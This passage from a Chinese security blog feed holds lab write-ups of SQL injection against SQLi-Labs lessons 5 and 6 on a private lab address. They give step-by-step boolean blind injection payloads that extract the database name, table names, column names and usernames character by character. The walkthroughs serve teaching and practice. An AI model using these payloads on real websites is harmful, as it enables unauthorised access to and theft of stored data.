href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-6/index.php?id=1</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/访问存在用户‘.png" alt="访问存在用户"></center></li><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-6/index.php?id=30</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/访问不存在用户.png" alt="访问不存在用户"></center></li><li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>http://10.10.10.148:86/Less-6/index.php?id=1&#39;</code>，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/单引号测试.png" alt="单引号测试"></center></li><li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=&quot;参数&quot; limit 0，1;</code>，<font color="red">参数为<code>String</code>型且使用单引号(<code>&quot;</code>)作为定界符</font>。因此，我们可以构造的恒真语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">" or "</span><span class="token number">1</span><span class="token string">"="</span><span class="token number">1</span><span class="token number">1</span>" <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>其中<code>1&quot; or &quot;1&quot;=&quot;1</code>payload的操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/payload操作结果.png" alt="payload操作结果"></center></li><li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 1--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 2--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 3--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" order by 4--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/order by 3测试结果.png" alt="order by 3测试结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/order by 4操作结果.png" alt="order by 4操作结果"></center></li><li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=-1" union select 1,2,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/union select判断回显.png" alt="union select判断回显"></center><p>注：</p><ul><li>由于上述操作可知SQL查询的结果不会回显在页面上，但是访问成功和访问失败所显示的页面不同。</li></ul></li><li><p>查看数据库版本。对于无法回显回显时可以根据响应的页面不同来获取信息。对于获取MySQL数据库的版本信息也是如此，可以使用payload如下所示，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(version(),1)>=5--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/获取数据库版本信息.png" alt="获取数据库版本信息"></center></li><li><p>爆数据库名称的长度。由上述操作得知MySQL的版本为<code>5.0</code>或高于<code>5.0</code>版本，因此数据库中存在<code>information_schema</code>数据库，因此可以使用如下payload爆当前数据库名称的长度，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>1--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>10--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>5--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>8--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length(database())>7--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/判断数据库长度是否大于8.png" alt="判断数据库长度是否大于8"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/判断数据库长度是否大于7.png" alt="判断数据库长度是否大于7"></center><p>由上述操作得知当前数据库命长长度为：<code>8</code>。</p></li><li><p>爆数据库名称。在得到数据库名称长度后，可以还需要爆数据库的名称。使用如下所示的payload可以爆出当前数据库名称的首字母，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'a'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'z'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'m'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'s'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'p'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'q'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)>'r'--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据库名称首字母是否大于s.png" alt="数据库名称首字母是否大于s"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据库名称首字母是否大于r.png" alt="数据库名称首字母是否大于r"></center><p>由上述操作得知当前数据库首字母为：<code>s</code>。</p><p>接着还需要爆数据库名称中其他位置的字符，数据库名称为<code>security</code>如下所示payload可逐个测试。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),1)='s'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),2)='se'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),3)='sec'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),4)='secu'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),5)='secur'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),6)='securi'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),7)='securit'--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and left(database(),8)='security'--+</span></code></pre><p>注：</p><ul><li><font color="blue">在正常测试中还是需要使用二分法，逐个逐位测试。</font></li></ul></li><li><p>爆数据表名称。在得到数据库名称后，还需要继续爆数据库中的数据表名称，在爆破表名称长度之前通常会先爆破数据表名称的长度。</p><p>爆<code>security</code>数据库中第一个数据表名称的长度。使用如下payload，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>1--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>10--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>5--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>8--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))>6--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据库表名称是否大于5.png" alt="数据库表名称是否大于5"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/数据表名称是否大于6.png" alt="数据表名称是否大于6"></center><p>由上述操作得知第一张数据表名称的长度为：<code>6</code>位。</p><p>逐位爆第一张数据表名称。使用如下所示payload，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否大于a</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97--+</span><span class="token comment" spellcheck="true">-- 是否大于z</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>122--+</span><span class="token comment" spellcheck="true">-- 是否大于m</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>109--+</span><span class="token comment" spellcheck="true">-- 是否大于g</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103--+</span><span class="token comment" spellcheck="true">-- 是否大于d</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100--+</span><span class="token comment" spellcheck="true">-- 是否大于e</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>101--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/第一张表名的首字母是否大于d.png" alt="第一张表名的首字母是否大于d"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/第一张表明的首字母是否大于ue.png" alt="第一张表明的首字母是否大于e"></center><p>由上述操作可以第一张表的首字母为：<code>e</code>。还需要继续爆破数据表名称中其他字符，第一张表名为：<code>emails</code>，使用如下payload可对数据表名进行测试。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第二位：m</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=109--+</span><span class="token comment" spellcheck="true">-- 第三位：a</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=97--+</span><span class="token comment" spellcheck="true">-- 第四位：i</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))=105--+</span><span class="token comment" spellcheck="true">-- 第五位：l</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=108--+</span><span class="token comment" spellcheck="true">-- 第六位：s</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))=115--+</span></code></pre><p>在对第一张表名爆破成功后，还需要对后续的数据表名进行爆破，使用如下所示的payload可以对后面的表进行爆破：</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">---------------------- 第二张表：referers -----------------------------</span><span class="token comment" spellcheck="true">-- 第二张表第一位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114--+</span><span class="token comment" spellcheck="true">-- 第二张表第二位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=101--+</span><span class="token comment" spellcheck="true">-- 第二张表第三位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),3,1))=102--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">-- 第二张表第八位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),8,1))=115--+</span><span class="token comment" spellcheck="true">------------------------------------------------------------------------</span><span class="token comment" spellcheck="true">---------------------- 第三张表：uagents -----------------------------</span><span class="token comment" spellcheck="true">-- 第三张表第一位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),1,1))=117--+</span><span class="token comment" spellcheck="true">-- 第三张表第二位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),2,1))=97--+</span><span class="token comment" spellcheck="true">-- 第三张表第三位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),3,1))=103--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">-- 第三张表第七位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),7,1))=115--+</span><span class="token comment" spellcheck="true">------------------------------------------------------------------------</span><span class="token comment" spellcheck="true">---------------------- 第四张表：users -----------------------------</span><span class="token comment" spellcheck="true">-- 第四张表第一位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))=117--+</span><span class="token comment" spellcheck="true">-- 第四张表第二位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1))=115--+</span><span class="token comment" spellcheck="true">-- 第四张表第三位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),3,1))=101--+</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment" spellcheck="true">-- 第四张表第五位：</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),5,1))=115--+</span><span class="token comment" spellcheck="true">------------------------------------------------------------------------</span></code></pre><p>由上述操作得知，<code>security</code>数据库中存在的数据表有：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code>。</p><p>注：</p><ul><li><p>如何判断数据表名称列举完？如下payload可以完成测试</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 4,1),1,1))>0--+</span></code></pre></li></ul></li><li><p>爆数据表列名。在得到数据表名称后，可以继续爆数据表中的字段信息，使用如下所示的payload可以爆出<code>users</code>表中第一个列名的长度，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>1--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>5--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>3--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))>2--+</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=2--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/第一个列名长度.png" alt="第一个列名长度"></center><p>利用<code>regexp</code>获取<code>user</code>表中的列。使用如下的payload，快速猜测数据表中是否存在与模式相匹配的列名，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 是否存在以us开头的列名</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+</span><span class="token comment" spellcheck="true">-- 是否存在username开头的列名</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^username' limit 0,1)--+</span><span class="token comment" spellcheck="true">-- 是否存在password开头的列名</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 0,1)--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/是否存在以username开头的列名、.png" alt="是否存在以username开头的列名"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/是否存在以password开头的列名.png" alt="是否存在以password开头的列名"></center></li><li><p>在得到数据库名称、数据表名称、数据列名称后，可以继续爆数据表中的字段值，使用如下所示的payload可以爆出<code>users</code>表中第一条数据的<code>username</code>值，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">-- 第一位：D</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),1,1))=68--+</span><span class="token comment" spellcheck="true">-- 第二位：u</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),2,1))=117--+</span><span class="token comment" spellcheck="true">-- 第三位：m</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),3,1))=109--+</span><span class="token comment" spellcheck="true">-- 第四位：b</span>http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-6/index.php?id=1" and ord(mid((select ifnull(cast(username as char),0x20)from security.users order by id limit 0,1),4,1))=98--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-DoubleQuotes-String/判断字段值第一位是否为D.png" alt="判断字段值第一位是否为D"></center></li></ol><h1 id="0x06-实验分析"><a href="#0x06-实验分析" class="headerlink" title="0x06 实验分析"></a>0x06 实验分析</h1><p>&emsp;&emsp;此实验模拟的一个没有错误回显的字符型注入，但是可以通过爆破猜解逐个逐位猜出数据库名称、数据表名称、数据表列名、数据表字段值等信息。最终目的是得到一组用户名及其密码。</p><ul><li>HTTP请求为：<code>GET</code></li><li>参数格式为：<code>select * from users where id=&quot;参数&quot;;</code></li><li>未进行转义、过滤等</li><li>可使用双引号判断注入类型</li><li>可以通过返回信息不同，判断注入是否成功</li></ul><h1 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h1><ul><li><p><a href="https://z1r0s.github.io/2020/09/29/mysql-zhu-ru-chang-yong-han-shu/">MySQL注入常用函数</a></p></li><li><p><a href="https://z1r0s.github.io/2020/09/07/sql-zhu-ru-bi-ji/">MySQL注入笔记</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> SQLi </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入之GET-DoubleInjection-SingleQuotes-String</title>
      <link href="/2020/10/18/sql-zhu-ru-zhi-get-doubleinjection-singlequotes-string/"/>
      <url>/2020/10/18/sql-zhu-ru-zhi-get-doubleinjection-singlequotes-string/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h1><p>&emsp;&emsp;<strong>SQL注入</strong>就是指Web应用程序对数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且将参数直接拼接成SQL语句带入数据库进行相关操作，攻击者可以通过构造不同的SQL语句来    实现对数据库的任意操作。</p><p>&emsp;&emsp;SQL注入<strong>按参数的数字类型</strong>可分为：<code>数字型(Integer)</code>、<code>字符型(String)</code>；<strong>按返回结果</strong>可分为：<code>显错注入(Error-Based)</code>、<code>基于布尔的盲注(Boolean-Based Blind)</code>、<code>基于时间的盲注(Time-Based Blind)</code>；<strong>按HTTP请求类型</strong>可分为：<code>GET型注入(GET)</code>、<code>POST型注入(POST)</code>。本文测试的注入类型为：GET型、显错型、字符型注入。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>服务器系统：<code>Windows Server 2008</code></li><li>中间件：<code>IIS</code></li><li>数据库：<code>MySQL</code></li><li>客户机：<code>Windows 10</code></li><li>靶机：<code>SQLi-Labs</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/实验环境.png" alt="实验环境"></center><h1 id="0x03-实验工具"><a href="#0x03-实验工具" class="headerlink" title="0x03 实验工具"></a>0x03 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x04-注入步骤"><a href="#0x04-注入步骤" class="headerlink" title="0x04 注入步骤"></a>0x04 注入步骤</h1><ol><li><strong>注入点判断</strong>。判断测试点是否存在SQL注入漏洞。</li><li><strong>注入类型判断</strong>。主要是判断注入点位置使用的SQL语句格式，若单引号未被过滤或转义，且回显报错信息，则使用单引号可以快速判断出注入类型。</li><li><strong>判断SQL语句中的列数</strong>。注入点正常显示的数据往往不是我们想要得到的数据，通常我们需要使用<code>union</code>或<code>报错</code>等操作，使得此注入点显示的数据是我们想要得到的，但构造我们需要的查询时必须要知道此位置的SQL语句中的列数，否则SQL执行时会发生错误。</li><li><strong>判断SQL语句操作的回显</strong>。判断SQL回显主要是通过对比来判断。使用<code>union</code>查询时我们需要找一个在前端显示的点，让我们查询到的数据显示出来；使用报错注入时也需要在前端显示我们想要得到的数据，所以需要先找到类似的回显，报错注入可以根据对比不同payload操作结果的对比来判断。但当该位置不存在回显信息或回显的错误信息被屏蔽时，我们可以采用对比响应的时候来判断回显，基于时间的盲注即采取这种方式。</li><li><strong>构造SQL注入获取数据库指纹等</strong>。在爆数据库内部信息时，需要先得到<code>数据库用户名</code>、<code>版本</code>、<code>数据库名称</code>等消息，这会对我们的后续注入有很大的帮助。例如：MySQL数据库5.0版本之后和之前的注入操作会有些许差别，另外数据库信息对我们查找对应的<code>1day</code>有很大的帮助。</li><li><strong>构造SQL语句爆数据表名</strong>。对数据库进行爆破的最终目的是爆数据库字段值，但在爆字段值之前我们需要知道相对应的字段名和表名，因此开始正式爆破时，需要先得到数据库的表名信息。</li><li><strong>构造SQL语句爆字段名</strong>。在拿到数据库表名信息后，需要继续爆破表中的字段值，以判断哪些字段是我们想要得到的。</li><li><strong>构造SQL语句爆字段值</strong>。爆破的最终目的就是爆表中的字段值，再得到表名、字段名后就需要尝试爆我们想要得到的字段值。</li></ol><h1 id="0x05-实验步骤"><a href="#0x05-实验步骤" class="headerlink" title="0x05 实验步骤"></a>0x05 实验步骤</h1><ol><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-5/index.php?id=1</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/访问存在用户.png" alt="访问存在用户"></center></li><li><p>按照页面提示信息在地址栏中访问<code>http://10.10.10.148:86/Less-5/index.php?id=30</code>，结果展示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/访问不存在用户.png" alt="访问不存在用户"></center></li><li><p>使用单引号测试SQL语句类型。在浏览器地址栏中输入:<code>http://10.10.10.148:86/Less-5/index.php?id=1&#39;</code>，访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/单引号测试结果.png" alt="单引号测试结果"></center></li><li><p>由上图中的报错信息可以推测出SQL语句大致为：<code>select * from users where id=&#39;参数&#39; limit 0，1;</code>，<font color="red">参数为<code>String</code>型且使用单引号(<code>&#39;</code>)作为定界符</font>。因此，我们可以构造的恒真语句为：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre><p>其中<code>1&#39; or &#39;1&#39;=&#39;1</code>payload的操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/or恒真测试.png" alt="payload恒真测试"></center></li><li><p>使用<code>order by</code>语句来获取SQL查询结果的列数。使用如下payload的执行结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment" spellcheck="true">--+</span>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">4</span><span class="token comment" spellcheck="true">--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/order by 1操作结果.png" alt="order by 1操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/order by 2操作结果.png" alt="order by 2操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/order by 3操作结果.png" alt="order by 3操作结果"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/order by 4操作结果.png" alt="order by 4操作结果"></center></li><li><p>由上述操作结果表明，该位置的SQL语句查询结果为3列。因此我们使用如下所示的payload来判断该注入点的回显位置，操作结果如下图所示。</p><pre class=" language-sql"><code class="language-sql">http:<span class="token comment" spellcheck="true">//10.10.10.148:86/Less-5/index.php?id=-1' union select 1,2,3--+</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/SQLInjection/GET-DoubleInjection-SingleQuotes-String/union select判断回显.png" alt="union select判断回显"></center><p>注：</p><ul><li>由于上述操作可知SQL查询的结果不会回显在页面上，但是访问成功和访问失败所显示的页面不同。</li></ul></li><li><p>查看数据库版本。对于无法回显回显时可以根据响应的页面不同来获取信息。对于获取MySQL数据库的版本信息也是如此，可以使用payload如下所示，操作结果如下图所示。</p><pre 